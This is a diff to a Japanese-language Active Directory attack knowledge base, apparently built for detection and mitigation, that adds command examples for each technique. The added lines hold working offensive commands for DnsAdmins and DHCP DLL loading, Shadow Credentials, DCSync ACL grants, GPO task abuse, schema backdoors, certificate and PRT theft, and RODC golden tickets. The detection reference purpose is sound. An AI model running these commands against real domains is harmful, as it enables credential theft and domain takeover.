+        "t": "DnsAdminsのRPC経由でDNSサービスにロードさせるDLLパスを設定。CVE-2021-40469パッチ前のDCで成立し`serverlevelplugindll`が決定的文字列",
+        "q": "dnscmd.exe dc01.corp.local /config /serverlevelplugindll \\\\10.0.0.5\\share\\evil.dll"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "DNSサービスを再起動しDLLロードを誘発。DnsAdminsはDNS Serverサービス自体の制御権も既定で持つため単独グループで完結する",
+        "q": "sc.exe stop dns\nsc.exe start dns"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "CVE-2021-40469パッチ後はDnsAdmins単独では効かず、既にDC管理者権限を得た攻撃者が持続化として移設先のInternalParametersへ直接書込む変種。旧Parametersキーへの書込はもはや無害",
+        "q": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\InternalParameters /v ServerLevelPluginDll /t REG_SZ /d C:\\Windows\\Temp\\evil.dll /f"
+      }
+    ],
     "detect": "ServerLevelPluginDllレジストリ/設定の変更、DNSサービスによる非標準DLLロード(Sysmon 7)、dns.exeの異常な子プロセスを検知する。DnsAdminsメンバー変更とDNSサービス再起動を相関する。",
     "events": "770 (DNS Serverログ), Sysmon 7 (dns.exe DLLロード), 7040 (サービス状態), ServerLevelPluginDllレジストリ監査(Parameters/InternalParameters両キー; CVE-2021-40469後はInternalParameters)",
     "mitigate": "最優先で2021年10月以降の累積更新(CVE-2021-40469対策)を全DC/DNSサーバに適用し、ServerLevelPluginDllが管理者のみ書込可能なInternalParametersキーへ移設された状態を確認する。DnsAdminsをメンバー0/最小化しTier0扱いにする。ServerLevelPluginDll(Parameters/InternalParameters双方)の変更を監査/禁止し、DNSをDCから分離(可能なら)、dnscmdのリモート操作を制限する。",
@@ -7607,6 +12511,28 @@ AD.I18N.ja.attacks = [
     "summary": "Key Admins/Enterprise Key Adminsが全オブジェクトのmsDS-KeyCredentialLinkを書けるため、ドメイン全体でShadow Credentialsを設定し任意アカウントとして認証できる見落とされがちな組込グループ。",
     "how": "Key Admins(またはフォレストのEnterprise Key Admins)メンバーは任意ユーザ/コンピュータのmsDS-KeyCredentialLink属性に攻撃者の証明書(公開鍵)を書き込める。Whisker/pyWhiskerでKeyCredentialを追加し、PKINITでその対象(DA/DC含む)としてTGTを取得(Pass-the-Certificate)、NTハッシュも回収して完全な成り済ましに至る。",
     "tools": "Whisker, pyWhisker, Rubeus (asktgt /getcredentials), Certipy (shadow)",
+    "cmd": [
+      {
+        "tool": "Whisker",
+        "t": "対象オブジェクトのmsDS-KeyCredentialLinkに攻撃者証明書を追加。`Whisker.exe add`と`/target:`の組合せが決定的",
+        "q": "Whisker.exe add /target:svc_target /domain:corp.local /dc:dc01.corp.local"
+      },
+      {
+        "tool": "pywhisker",
+        "t": "Linux側からの同等操作。`--action add`指定でKeyCredentialを追加しDC側は4662(属性書込)として記録される",
+        "q": "pywhisker.py -d corp.local -u svc_user -p 'Passw0rd!' --dc-ip 10.0.0.10 --target svc_target --action add"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "追加した証明書でPKINITしTGT取得と同時にNTハッシュも回収。`/getcredentials`はShadow Credentials特有のフラグで極めて高精度",
+        "q": "Rubeus.exe asktgt /user:svc_target /certificate:MIIJ...base64pfx /password:Passw0rd! /getcredentials /show"
+      },
+      {
+        "tool": "Certipy",
+        "t": "追加からPKINIT・NTハッシュ回収までを一括実行する`shadow auto`。`shadow`サブコマンド自体が同ツールの他機能と明確に区別できる文字列",
+        "q": "certipy shadow auto -u svc_user@corp.local -p 'Passw0rd!' -account svc_target -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "msDS-KeyCredentialLink属性の変更(5136)を全オブジェクトで監視し、Key Admins/Enterprise Key Adminsのメンバー変更を検知する。特権アカウントへのKeyCredential追加とその後のPKINIT認証を相関する。",
     "events": "5136 (msDS-KeyCredentialLink変更), 4768 (PKINIT TGT), 4728 (Key Admins=グローバル追加) / 4756 (Enterprise Key Admins=ユニバーサル追加)",
     "mitigate": "Key Admins/Enterprise Key Adminsを空に保ちTier0管理する。msDS-KeyCredentialLink変更を監査アラート化、ADCS未使用ならNGC/KeyCredentialの棚卸し、特権アカウントの保護を行う。",
@@ -7647,6 +12573,28 @@ AD.I18N.ja.attacks = [
     "summary": "Exchange導入で付与される過剰ACL(Exchange Windows PermissionsのドメインオブジェクトへのWriteDACL)を悪用し、自身にDCSync権限を付与してドメインを掌握する手法。",
     "how": "Exchange Windows PermissionsグループはドメインオブジェクトにWriteDACLを持つため、当該グループ(またはExchange Trusted Subsystem)を制御できれば、ドメインルートのDACLにReplicating Directory Changes/All(DCSync)ACEを自アカウントへ追加する。以後secretsdump/DCSyncで全ハッシュ(krbtgt)を取得しドメイン支配に至る。リレー版PrivExchangeと異なりACL悪用として成立する。",
     "tools": "PowerView (Add-DomainObjectAcl), impacket-dacledit, aclpwn, ntdsutil/secretsdump",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "Exchange Windows PermissionsのWriteDACLでドメインルートに自身のDCSync権を追加。`-Rights DCSync`という専用ショートカット指定が決定的",
+        "q": "Add-DomainObjectAcl -TargetIdentity \"DC=corp,DC=local\" -PrincipalIdentity svc_user -Rights DCSync"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側から同じACE追加をLDAPで直接実行。`-rights DCSync`は攻撃元にしか残らずDC側のプロセスログには一切現れない",
+        "q": "dacledit.py -action write -rights DCSync -principal svc_user -target-dn \"DC=corp,DC=local\" corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "dsacls.exe",
+        "t": "OS標準LOLBinでの同等操作。拡張権利名`CA;Replicating Directory Changes All`という文字列自体が強シグナルで正規運用では出ない",
+        "q": "dsacls.exe \"DC=corp,DC=local\" /G \"corp\\svc_user:CA;Replicating Directory Changes All\""
+      },
+      {
+        "tool": "Impacket",
+        "t": "付与した権限を即座に行使しkrbtgt含む全ハッシュをDCSyncで取得。ACL変更の4662からDCSync実行までの短時間相関が検知の鍵",
+        "q": "secretsdump.py corp.local/svc_user:'Passw0rd!'@10.0.0.10"
+      }
+    ],
     "detect": "ドメインルートDACLへのACE追加、特にDS-Replication-Get-Changes系のACE付与(5136 nTSecurityDescriptor変更)を検知する。Exchange関連グループのメンバー/ACL変更、直後のDCSync(4662)を相関する。",
     "events": "5136 (nTSecurityDescriptor / DCSync ACE), 4662 (Replication権限使用), 4732",
     "mitigate": "Exchange split-permissionモデルを採用しExchange Windows PermissionsのドメインWriteDACLを削減する(MSの緩和ガイダンス適用)。ドメインルートDACL変更を監査、Exchangeサーバ/グループをTier0保護する。",
@@ -7687,6 +12635,38 @@ AD.I18N.ja.attacks = [
     "summary": "見落とされがちな各種組込・委任グループ(Cert Publishers, DHCP Administrators, Group Policy Creator Owners等)の権限を悪用する昇格・永続化経路のまとまり。",
     "how": "Group Policy Creator OwnersはGPOを新規作成でき、リンク権限と組み合わせてOU配下の端末に即時タスクを配布し横展開する。DHCP AdministratorsはDHCP/DNS動的更新設定を操作しネームレゾリューション改ざんに繋げる。Cert PublishersはコンピュータオブジェクトのuserCertificate書込に関与しうる。いずれも過小評価される委任グループから特権経路を組み立てる。",
     "tools": "PowerView, GPOwned/SharpGPOAbuse, bloodyAD, netsh dhcp",
+    "cmd": [
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "委任されたGPO作成/編集権を悪用しGPOへ即時実行のコンピュータタスクを仕込む。`--AddComputerTask`と`--GPOName`の組合せが決定的",
+        "q": "SharpGPOAbuse.exe --AddComputerTask --TaskName Update --Author corp\\svc_user --Command cmd.exe --Arguments \"/c net localgroup administrators corp\\svc_user /add\" --GPOName \"Default Domain Policy\""
+      },
+      {
+        "tool": "GroupPolicy",
+        "t": "OS標準RSATモジュールでの正規GPO作成とOUへのリンク。ツール名検知は効かずGPO作成者アカウントと適用先OUの不整合で見るしかない",
+        "q": "New-GPO -Name Update -Domain corp.local | New-GPLink -Target \"OU=Workstations,DC=corp,DC=local\""
+      },
+      {
+        "tool": "GroupPolicy",
+        "t": "GPOの編集/セキュリティ変更権を別アカウントへ委任し昇格経路を延伸。`GpoEditDeleteModifySecurity`という権限名の文字列が特徴的",
+        "q": "Set-GPPermission -Name Update -TargetName svc_user -TargetType User -PermissionLevel GpoEditDeleteModifySecurity"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "DHCP AdministratorsのサービスDNSコールバック登録権を悪用しDnsAdminsと同型のDLLを読み込ませる。公式ドキュメント上のキー名 `CalloutDlls`/`CalloutEnabled` が決定的",
+        "q": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DHCPServer\\Parameters /v CalloutDlls /t REG_SZ /d C:\\Windows\\Temp\\evil.dll /f\nreg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DHCPServer\\Parameters /v CalloutEnabled /t REG_DWORD /d 1 /f"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "DHCPサービスを再起動しコールバックDLLのロードを誘発。DHCP AdministratorsはDHCPServerサービス自体の制御権も持つ",
+        "q": "sc.exe stop dhcpserver\nsc.exe start dhcpserver"
+      },
+      {
+        "tool": "ActiveDirectory",
+        "t": "Cert Publishersはユーザ/コンピュータのuserCertificate等属性の書込権に限定され単独で確立した昇格コマンド系列は無い。最も近い実観測はcACertificate属性への直接書込",
+        "q": "Set-ADObject \"CN=corp-CA,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local\" -Add @{cACertificate=(Get-Content evil.cer -Encoding Byte)}"
+      }
+    ],
     "detect": "これら委任グループのメンバー変更(4728/4732/4756)と、その権限を使ったGPO作成・DHCP/DNS設定変更を検知する。BloodHoundで各グループの実効到達性(Outbound Control)を定期評価する。",
     "events": "4728/4732/4756 (グループ追加), 5136 (GPO/ACL変更), 5137 (GPOオブジェクト作成)",
     "mitigate": "各委任グループのメンバーを棚卸し最小化し、Group Policy Creator Owners等のGPO作成/リンク権限を限定する。BloodHoundで攻撃経路を可視化し過剰委任を除去、変更を監査アラート化する。",
@@ -7727,6 +12707,28 @@ AD.I18N.ja.attacks = [
     "summary": "スキーマクラスのdefaultSecurityDescriptorを改変し、将来生成される全オブジェクトへ恒久的バックドアACEを仕込む高度なドメイン支配・永続化手法。",
     "how": "Schema Admins権限でスキーマクラス(例: user, computer)のdefaultSecurityDescriptorを書き換え、攻撃者SIDにFullControl/GenericAll等のACEを埋め込む。以後そのクラスから新規作成される全オブジェクトが攻撃者制御下のACEを継承し、パッチや権限リセット後も新規オブジェクト経由で支配を回復できる長期永続バックドアとなる。スキーマ変更はフォレスト全体に影響し不可逆性が高い。",
     "tools": "ldapmodify, ADSI Edit, PowerShell (Set-ADObject on schema)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "userクラスのdefaultSecurityDescriptorへ攻撃者SIDのACEを追記。CN=Schema配下への書込は5136(属性=defaultSecurityDescriptor)としてほぼ確実に記録される",
+        "q": "Set-ADObject -Identity \"CN=User,CN=Schema,CN=Configuration,DC=corp,DC=local\" -Replace @{defaultSecurityDescriptor=\"D:(A;;GA;;;S-1-5-21-1111111111-2222222222-3333333333-1105)\"}"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "LDIF経由でスキーマNCを直接改変。攻撃元に端末ログは残らずDC側の5136とスキーマ更新後のUSN変化のみが証跡",
+        "q": "ldapmodify -x -H ldap://dc01.corp.local -D \"CN=Administrator,CN=Users,DC=corp,DC=local\" -w 'Passw0rd!' -f schema_backdoor.ldif"
+      },
+      {
+        "tool": "ADSI Edit",
+        "t": "GUIでスキーマクラスの属性を直接編集。プロセス名は`mmc.exe`のみでコマンドライン検知は効かずスキーマNCの5136相関が唯一の手掛かり",
+        "q": "mmc.exe adsiedit.msc"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShell内で同一属性を書換。4104のスクリプトブロックに`defaultSecurityDescriptor`という属性名がそのまま残る",
+        "q": "Set-DomainObject -SearchBase \"CN=Schema,CN=Configuration,DC=corp,DC=local\" -Identity \"CN=User\" -Set @{defaultSecurityDescriptor='D:(A;;GA;;;S-1-5-21-1111111111-2222222222-3333333333-1105)'}"
+      }
+    ],
     "detect": "スキーマNCオブジェクトのdefaultSecurityDescriptor変更(5136)、Schema Adminsメンバー変更を最重要イベントとして検知する。新規作成オブジェクトに共通する不審なACEの出現を定期監査する。",
     "events": "5136 (schema defaultSecurityDescriptor変更), 4756/4728 (Schema Admins追加), 4662",
     "mitigate": "Schema Adminsを空に維持し変更時のみ一時追加する運用にする。スキーマNC変更を監査アラート化、defaultSecurityDescriptorのベースライン比較を定期実施、Tier0厳格管理を行う。",
@@ -7767,6 +12769,28 @@ AD.I18N.ja.attacks = [
     "summary": "既存GPOの編集権限を悪用し、即時スケジュールタスク配布やRestricted Groupsによるローカル管理者強制追加で配下端末にコード実行・永続化を仕掛ける具体的ベクタ。",
     "how": "GPOへの書込権限がある場合、SharpGPOAbuseでImmediate Scheduled Task(即時タスク)をGPPに追加し、リンクされたOU配下の全端末でSYSTEM/ユーザ権限のコマンドを実行させる。またはRestricted Groups/GPP Local Users and Groupsで攻撃者アカウントを各端末のローカルAdministratorsに強制追加して横展開・永続化する。",
     "tools": "SharpGPOAbuse, pyGPOAbuse, PowerView (GPO ACL), GPOwned",
+    "cmd": [
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "GPPの即時スケジュールタスクをSYSVOLへ配布し次回GPO更新でリンク先端末に実行させる。`--AddComputerTask`とタスク名がSYSVOL上のXML及び5136の痕跡",
+        "q": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author CORP\\svc_user --Command \"cmd.exe\" --Arguments \"/c whoami > C:\\Windows\\Temp\\out.txt\" --GPOName \"Default Domain Policy\""
+      },
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "Restricted Groupsを悪用しリンク先端末のローカルAdministratorsへ強制追加。`--AddLocalAdmin`がGptTmpl.inf書換の直接証跡",
+        "q": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount svc_user --GPOName \"Default Domain Policy\""
+      },
+      {
+        "tool": "pyGPOAbuse",
+        "t": "Linux側からSYSVOL上のGPP XMLを直接生成しタスクを配布。端末の実行ログはなくSMB経由のSYSVOL書込みとGPO更新後の対象タスク実行で見る",
+        "q": "pygpoabuse.py corp.local/svc_user:'Passw0rd!' -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname SecurityUpdate -dc-ip 10.0.0.10 -command \"whoami\" -filter-enabled -target-dns-name ws01.corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "GPOオブジェクトへの書込権を自身へ付与する前段。GUID形式のGPO DNへのACE追加が5136に残る",
+        "q": "Add-DomainObjectAcl -TargetIdentity 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local' -PrincipalIdentity svc_user -Rights All"
+      }
+    ],
     "detect": "GPO(特にSYSVOLのScheduledTasks.xml/Groups.xml)の変更(5136/5145 SYSVOL書込)、gptmpl/GPP追加を検知する。クライアントでgpsvc起因の即時タスク実行、ローカルAdministrators追加(4732 local)を監視する。",
     "events": "5136 (versionNumber/gPCFileSysPath), 5145 (SYSVOL書込), 4732 (ローカルAdmin追加), Sysmon 1",
     "mitigate": "GPOの編集/リンク権限を最小化しGPO変更を監査アラート化する。SYSVOLの整合性監視、Restricted Groupsのベースライン化、重要GPOへの書込ACL棚卸しを行う。",
@@ -7807,6 +12831,33 @@ AD.I18N.ja.attacks = [
     "summary": "窃取またはShadow Credentials/ADCSで得たPFX/証明書を用い、PKINITでTGTを取得しSchannelでLDAPS認証を行う横展開手法(認証利用としての独立技術)。",
     "how": "THEFT/ESC/Shadow Credentialsで入手したユーザ/コンピュータの証明書(PFX)を使い、Rubeus asktgt /certificateやCertipy authでPKINIT TGTを取得する。UnPACやU2Uと組み合わせNTハッシュも回収でき、あるいはPKINITが無効でもSchannel経由でLDAPS(証明書マッピング)に認証してRBCD付与やDCSyncに繋げる。",
     "tools": "Rubeus (asktgt /certificate), Certipy (auth), PassTheCert, gettgtpkinit.py",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "窃取PFXでPKINIT TGTを取得しそのままセッションへ注入。`/certificate:`と`.pfx`拡張子の組合せが最も残りやすい文字列",
+        "q": "Rubeus.exe asktgt /user:svc_user /certificate:stolen.pfx /password:'Passw0rd!' /ptt /nowrap"
+      },
+      {
+        "tool": "Certipy",
+        "t": "PKINITとNTハッシュ取得を同時に行う代替経路。Linux発のためDC側は4768の証明書発行者情報のみが手掛かり",
+        "q": "certipy auth -pfx stolen.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PassTheCert",
+        "t": "PKINIT無効時でもSchannel経由でLDAPS証明書マッピング認証を確立。DC側でTLSクライアント証明書提示を伴うLDAPS接続として現れる",
+        "q": "python passthecert.py -action ldap-shell -crt stolen.crt -key stolen.key -domain corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PassTheCert",
+        "t": "確立したLDAPSセッションでmsDS-AllowedToActOnBehalfOfOtherIdentityを書換えRBCDへ接続。5136のRBCD属性変更が決定的シグナル",
+        "q": "python passthecert.py -action write_rbcd -crt stolen.crt -key stolen.key -delegate-to 'ATTACKERPC$' -delegate-from 'DC01$' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "UnPAC-the-hashと組合せ可能なLinux側TGT取得。端末プロセスログが残らずDCの4768のみが手掛かり",
+        "q": "python gettgtpkinit.py corp.local/svc_user -cert-pfx stolen.pfx -pfx-pass 'Passw0rd!' svc_user.ccache"
+      }
+    ],
     "detect": "PKINITによるTGT発行(4768で証明書情報あり)、想定外の証明書ベースLDAPS認証、Schannel経由のクライアント証明書マッピングを検知する。短期間に多数アカウントの証明書認証、非標準テンプレートの証明書使用を監視する。",
     "events": "4768 (PKINIT TGT, Certificate Information), 4887/4886 (ADCS発行), Schannelログ (36880系)",
     "mitigate": "証明書ベース認証の強力な証明書マッピング(KB5014754 strong mapping)を強制し、脆弱テンプレート/ESCを是正する。窃取証明書の失効、機微アカウントのKeyCredential監査、ADCS保護を行う。",
@@ -7847,6 +12898,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra(Azure AD)ハイブリッド参加端末からPRT/PRT-cookie/セッションキーを窃取し、クラウドSSO・MFA回避でEntraリソースへアクセスするハイブリッド攻撃面。",
     "how": "参加端末上でSYSTEM/管理者権限を得た後、LSASS(CloudAP)やDPAPIからPRTとそのセッションキー(PRT発行時にEntraが生成し、デバイスのトランスポート鍵で暗号化して配布される。サーバのNonce由来ではない)を抽出し、x-ms-RefreshTokenCredential(PRT-cookie)を生成する。PRT-cookieはCloudAPがセッションキーとランダムなctxからKDFで導出したDerived Keyで署名される。CVE-2021-33779のパッチ(KDFv2、現行)以降はサーバ供給のrequest_nonceも当該KDFに投入されるため(単なるリプレイ防止用の埋め込みではない)、セッションごとに有効なNonceの取得が必須で、Nonce無し/使い回しのcookieは検証を通らない。Derived Keyは毎回のTPMアクセスを避けるためLSASSに平文キャッシュされる。これをブラウザに注入してEntraのSSOを成立させ、多くの場合MFAを再要求されずにクラウドアプリ(M365, Azure)へアクセスする。デバイス鍵/トランスポート鍵の悪用やUnPAC/U2U併用で持続的なトークン発行も可能。",
     "tools": "ROADtoken, AADInternals, Mimikatz (sekurlsa/cloudap), requestaadrefreshtoken, TokenTactics",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "LSASS内のCloudAPプラグインからPRTと導出済みセッションキーを平文抽出。`sekurlsa::cloudap`が決定的シグナル",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::cloudap\" exit"
+      },
+      {
+        "tool": "ROADtoken",
+        "t": "ブラウザのネイティブメッセージングホスト(browsercore.exe)を偽バイナリへ差し替えNonce済みPRT-cookieを生成させる。正規パスへの上書きコピー自体が検知点",
+        "q": "copy roadtoken.exe \"C:\\Program Files\\Windows Security\\BrowserCore\\browsercore.exe\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "窃取したセッションキーでPRTのJWTを再構築しCookieとして再利用可能な形にする",
+        "q": "New-AADIntUserPRTToken -RefreshToken $prt -SessionKey $key"
+      },
+      {
+        "tool": "TokenTactics",
+        "t": "PRTから交換したリフレッシュトークンでMSGraphアクセストークンへ更新し続ける。継続的なトークン更新はサインインログの短間隔リフレッシュとして残る",
+        "q": "Invoke-RefreshToMSGraphToken -domain corp.onmicrosoft.com -ClientId 1b730954-1685-4b74-9bfd-dac224a7b894 -refreshToken 0.AXo..."
+      },
+      {
+        "tool": "PowerShell",
+        "t": "生成したPRT-cookie(x-ms-RefreshTokenCredential)をブラウザセッションへ注入しEntra SSOを成立させる。ホスト側の書込みイベントが手掛かり",
+        "q": "Set-Cookie -Name \"x-ms-RefreshTokenCredential\" -Value $prtCookie -Domain \"login.microsoftonline.com\""
+      }
+    ],
     "detect": "Entra ID サインインログで異常なデバイス/場所からのPRTベースSSO、非対話トークン発行、既知ツールのUser-Agentを検知する。端末側でLSASS(CloudAP)アクセス、PRT-cookie生成の兆候をEDRで監視する。",
     "events": "Entra Sign-in logs (PRT/deviceトークン), 4624 + LSASSアクセス (Sysmon 10), Identity Protectionリスク検知",
     "mitigate": "Conditional Access(デバイスコンプライアンス/フィッシング耐性MFA/トークン保護)を適用し、端末のTPMベースデバイス鍵とCredential Guardを有効化する。リスクベースサインインでPRT悪用を遮断、端末の管理者権限最小化を行う。",
@@ -7887,6 +12965,28 @@ AD.I18N.ja.attacks = [
     "summary": "平文やハッシュなしに、現在のログオンセッションからGSS-APIの委任機構を悪用して使用可能な自ユーザTGT(セッション鍵付き)を抽出する手法。",
     "how": "Rubeus tgtdelegはKekeoのtgt::delegトリックを踏襲する。AcquireCredentialsHandleで現ユーザのKerberos資格情報ハンドルを取得後、InitializeSecurityContextをISC_REQ_DELEGATE(委任要求)フラグ付きで、非制約委任が構成されたサービスのSPN(既定はcifs/HOST等のDC向けSPN。DCは既定で委任を信頼)を標的に呼ぶ。生成されるAP-REQのAuthenticatorチェックサムにKRB-CRED(転送された自ユーザTGT)が格納されるため、ローカルKerberosキャッシュのサービスチケットセッション鍵でこれを復号し、使用可能なTGTとセッション鍵を取り出す。管理者権限やハッシュは不要だが、標的SPNに非制約委任が構成されている必要がある(既定環境ではDCが該当するため成立する)。抽出したTGTはPass-the-Ticketや後続のS4U/委任攻撃の起点となる。なお2019年以降のWindows更新でフォレスト信頼を跨ぐ委任TGTは既定で転送されなくなり、クロスフォレストでの本手法の悪用は縮小している。",
     "tools": "Rubeus (tgtdeleg), 相当のSSPI委任コード",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "GSS-API委任を悪用し現ユーザーの使用可能なTGTを抽出。ハッシュもパスワードも不要で`tgtdeleg`という文字列自体が強シグナル",
+        "q": "Rubeus.exe tgtdeleg"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "取得したTGTをファイル保存しオフラインで持ち出す。`/nowrap`でBase64折り返しを止めて扱いやすくする",
+        "q": "Rubeus.exe tgtdeleg /nowrap /outfile:tgt.kirbi"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "抽出と同時に現在のログオンセッションへ即注入。以降のKerberos認証が本来のログオンTGTと異なる経路で発生する",
+        "q": "Rubeus.exe tgtdeleg /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "委任先SPNを明示指定。既定のcifs/DC以外を狙う場合はこの`/target`指定の有無が唯一の差分になる",
+        "q": "Rubeus.exe tgtdeleg /target:cifs/dc01.corp.local /ptt"
+      }
+    ],
     "detect": "tgtdeleg単体はネットワーク的に正規のKerberosに見え検知が難しいため、抽出後のPass-the-Ticket(異なるホストでの同一TGT使用、IP不一致の4769)を検知する。Rubeusプロセス/コマンドラインのEDR検知を併用する。",
     "events": "4769 (TGS要求, PtT兆候), 4768, EDRプロセス検知 (Rubeus)",
     "mitigate": "機微アカウントをProtected Users(TGT委任不可、AES強制)に配置しKerberosアーマリング(FAST)を導入する。非制約委任の廃止、TGT寿命短縮、Pass-the-Ticket検知(チケット再利用相関)を運用する。",
@@ -7927,6 +13027,33 @@ AD.I18N.ja.attacks = [
     "summary": "RODCのPassword Replication Policy(msDS-RevealOnDemand/NeverRevealGroup)とローカル管理者委任を悪用し、RODCにキャッシュ可能な範囲のアカウント資格情報を引き出す。支社/DMZ配置のRODCが起点になる。",
     "how": "RODCのローカル管理者(管理者ロール委任)を得た攻撃者は、RODCが保持するキャッシュ済みシークレットを抽出する。PRP許可リスト(msDS-RevealOnDemand)に含まれるアカウントは要求時にRODCへ複製されキャッシュされるため、標的を許可対象にして認証させ、RODC上でNTDS/LSAからハッシュを取得する。Allowed RODC Password Replication Groupの構成不備で高権限アカウントがキャッシュ対象になっているケースが致命的。",
     "tools": "Get-ADDomainControllerPasswordReplicationPolicy, repadmin /prp, mimikatz/secretsdump(RODC上), PowerView, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "RODCのPRP許可/拒否リストをLDAP経由で列挙。`-Allowed`を伴うcmdlet実行が偵察の起点",
+        "q": "Get-ADDomainControllerPasswordReplicationPolicy -Identity RODC01 -Allowed | Format-Table Name,ObjectClass"
+      },
+      {
+        "tool": "repadmin.exe",
+        "t": "実際にRODCへ複製済み(キャッシュ済み)アカウント一覧を確認。`/prp view ... reveal`が固有の引数列",
+        "q": "repadmin.exe /prp view RODC01 reveal"
+      },
+      {
+        "tool": "ntdsutil.exe",
+        "t": "RODC自身でローカルにIFMエクスポートを実行。RODCはDRS複製元になれないためこの手法が必要",
+        "q": "ntdsutil.exe \"activate instance ntds\" ifm \"create full C:\\Windows\\Temp\\ifm\" quit quit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "IFMダンプをオフライン解析。PRP許可済みアカウントのみ実ハッシュが得られる",
+        "q": "secretsdump.py -ntds \"C:\\Windows\\Temp\\ifm\\Active Directory\\ntds.dit\" -system C:\\Windows\\Temp\\ifm\\registry\\SYSTEM LOCAL"
+      },
+      {
+        "tool": "PowerView",
+        "t": "msDS-RevealOnDemandGroup等をLDAP属性として直接取得。公式cmdlet名を経由せずモジュール名ベース検知を回避",
+        "q": "Get-DomainComputer -Identity RODC01 -Properties 'msds-revealondemandgroup','msds-neverrevealgroup','msds-revealedusers'"
+      }
+    ],
     "detect": "RODCのPRP属性(msDS-RevealOnDemand/msDS-NeverRevealGroup)変更、Allowed RODC Password Replication Groupのメンバー変更、RODCへの想定外アカウントの資格情報複製を監視。RODCローカル管理者の異常操作をEDRで検知。",
     "events": "4728/4732(グループ変更), 5136(PRP属性変更), 4662",
     "mitigate": "PRP許可リストを最小化し、特権/Tier0アカウントをRODCにキャッシュさせない(Denied RODC Password Replication Group / msDS-NeverRevealGroup)。RODCのローカル管理者委任を厳格化し物理保護。RODCを機微アカウントの認証経路から除外する。",
@@ -7967,6 +13094,28 @@ AD.I18N.ja.attacks = [
     "summary": "RODC固有のkrbtgtアカウント(krbtgt_NNNNN)の鍵を入手し、そのRODCがサービスする範囲(PRP許可アカウント)に限定されたGolden Ticket相当のTGTを鍛造する。",
     "how": "RODCを侵害しRODC専用krbtgt(msDS-KrbTgtLinkが指すkrbtgt_<numeric>)のハッシュを取得。このRODC-krbtgtで鍛造したTGTは、PRPで当該RODCへの複製が許可されたアカウント/リソースに対してのみ有効という制約付きGolden Ticketになる。範囲は限定的だが支社環境の永続化に使える。書込可能DCのkrbtgtとは別鍵である点に注意。",
     "tools": "mimikatz (kerberos::golden with RODC krbtgt), Rubeus, secretsdump(RODC)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "RODC専用krbtgt_<番号>アカウントのハッシュをDCSyncで取得。`krbtgt_`prefix指定が通常のkrbtgt窃取との決定的な違い",
+        "q": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt_12345\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "RODC-krbtgtのハッシュで鍛造。書込可能DCのkrbtgtと同一構文だが有効範囲はPRP許可アカウントに限定される",
+        "q": "mimikatz.exe \"kerberos::golden /user:svc_user /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<RODC_KRBTGT_NTHASH> /ptt\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "`/rodcNumber`でRODCのKRBTGTキーによるKey List Requestを実行。このフラグの出現自体がRODC-krbtgt悪用の一次証拠",
+        "q": "Rubeus.exe golden /rc4:<RODC_KRBTGT_NTHASH> /user:svc_user /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rodcNumber:12345 /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "RODC上のkrbtgt_<番号>のみを狙い撃ちで複製。攻撃元にプロセスログは残らずRODC側の4662(該当アカウントのみ)が手掛かり",
+        "q": "secretsdump.py corp.local/administrator@10.0.0.10 -just-dc-user krbtgt_12345"
+      }
+    ],
     "detect": "RODC-krbtgtで発行された異常なTGT、当該RODC配下での想定外の高権限アクセス、RODC krbtgtの異常アクセスを監視。通常のkrbtgt同様に寿命/RC4異常を検知。",
     "events": "4769 (対応する4768なし), 4624, 4672",
     "mitigate": "RODC侵害時はRODC-krbtgt(krbtgt_NNNNN)をリセット。PRP範囲を最小化し、RODCに高権限をキャッシュさせない。RODCの物理/論理保護とTier0分離。",
@@ -8007,6 +13156,33 @@ AD.I18N.ja.attacks = [
     "summary": "SCCM/MECMのサイトサーバまたはサイトデータベースの過剰権限を突いてサイト階層を掌握し、コレクション全端末へのSYSTEM実行・資格情報回収でドメイン規模の支配に至る。",
